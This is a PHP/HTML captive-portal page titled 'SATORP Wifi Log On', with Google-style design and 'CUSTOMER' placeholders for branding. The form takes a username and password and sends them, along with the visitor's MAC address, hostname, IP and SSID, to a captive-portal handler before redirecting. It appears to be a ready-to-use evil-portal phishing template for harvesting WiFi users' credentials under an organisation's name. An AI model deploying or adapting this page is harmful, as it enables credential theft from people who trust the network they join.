<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

require_once('helper.php');
?>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <script type="text/javascript">
    function redirect() 
      { 
        var val = document.getElementById("logOnForm").elements.namedItem("username").value;
        var url = "success.php?username=" + val;
	      setTimeout(function(val){window.location = url;},100);
      }
  </script>

  <title>SATORP Wifi Log On</title>

  <link 
    href='data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMglEwCkbBSAcACBAAAeaR9cIAAAAASUVORK5CYII='
    rel='shortcut icon' type='image/x-icon'
  >
  <!-- <link rel="stylesheet" href="style.css"> -->
  <style>
    body {
        margin: 0;
        padding: 0;
        background-size: cover;
        font-family: sans-serif;
      }
      
      .box {
        position: absolute;
        top: 40%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 25rem;
        padding: 2.5rem;
        box-sizing: border-box;
        border: 1px solid #dadce0;
        -webkit-border-radius: 8px;
        border-radius: 8px;

      }
      
      .box h2 {
        margin: 0px 0 -0.125rem;
        padding: 0;
        color: #fff;
        text-align: center;
        color: #202124;
        font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
        font-size: 24px;
        font-weight: 400;
      }

      .box p {
        font-size: 16px;
        font-weight: 400;
        letter-spacing: .1px;
        line-height: 1.5;
        margin-bottom: 25px;
        text-align: center;
      }
      
      .box .inputBox {
        position: relative;
      }
      
      .box .inputBox input {
        width: 93%;
        padding: 0.625rem 10px;
        font-size: 1rem;
        letter-spacing: 0.062rem;
        margin-bottom: 1.875rem;
        border: 1px solid #ccc;
        background: transparent;
        border-radius: 4px;
        
      }
      
      .box .inputBox label {
        position: absolute;
        top: 0;
        left: 10px;
        padding: 0.625rem 0;
        font-size: 1rem;
        color: grey;
        pointer-events: none;
        transition: 0.5s;
      }
      
      .box .inputBox input:focus ~ label,
      .box .inputBox input:valid ~ label,
      .box .inputBox input:not([value=""]) ~ label {
        top: -1.125rem;
        left: 10px;
        color: #1a73e8;
        font-size: 0.75rem;
        background-color: white;
        height: 10px;
        padding-left: 5px;
        padding-right: 5px;
      }
      .box .inputBox input:focus {
        outline: none;
        border: 2px solid #1a73e8;
      }
      .box input[type="submit"] {
        border: none;
        outline: none;
        color: #fff;
        background-color: #1a73e8;
        padding: 0.625rem 1.25rem;
        cursor: pointer;
        border-radius: 0.312rem;
        font-size: 1rem;
        float: right;
      }
      
      .box input[type="submit"]:hover {
        background-color: #287ae6;
        box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
      }

      .align-middle {
        vertical-align: middle;
      }

      #horizontal-line{ 
      display: block;
      margin-top:100px;
      margin-bottom: 60px;
      width:96%;
      margin-left: auto;
      margin-right: auto;
      border-style: inset;
      border-width: 2px;
      border-color: #F0F0F0;
      } 
      #footer {
        position: absolute;
        width: 100%; 
        bottom : 4%;
        height:60px;
        margin: auto;
        margin-top : 40px;
        border-top: 1px solid #aaa;
        text-align: center ;
        font-size: 11px ;
        font-family: 'auto' ;
      }

  </style>
</head>

<body>
  <div class="box">
    <div>
      <!-- PUT CUSTOMER LOGO HERE -->
      <img class="align-middle" src="data:image/png;base64, DwCQmCwlkRO5HAAAAABJRU5ErkJggg==" />
    </div>
    <h2>WiFi Log On</h2>
    <p>CUSTOMER 5G wifi internet access NEW!</p>
    <form id="logOnForm" method="POST" action="/captiveportal/index.php" onsubmit="return redirect()" accept-charset="UTF-8" autocomplete="off" role="form" >

      <div class="inputBox">
        <input type="text" name="username" id="username" required onkeyup="this.setAttribute('value', this.value);" value="">
        <label>Username/Email</label>
      </div>
      <div class="inputBox">
        <input type="password" name="password" id="password" required onkeyup="this.setAttribute('value', this.value);" value="">
        <label>Passward</label>
      </div>
      <div>
        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac"      value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip"       value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="ssid"     value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="target"   value="<?=$destination?>">
      </div>
    
      <input type="submit" name="sign-in" value="Log On">
    </form>
  </div>

</body>
<br><br>
<footer>
  <div id="footer">
    <div class="img-text">
      <!-- PUT CUSTOMER LOGO HERE -->
      <img class="align-middle" width="40" height="50" src="data:image/png;base64, DwCQmCwlkRO5HAAAAABJRU5ErkJggg==" alt="Red dot" />
      <!-- PUT CUSTOMER NAME HERE -->
      <span class="align-middle">© CUSTOMER NAME</span>
    </div>
  </div>
</footer>
</html>
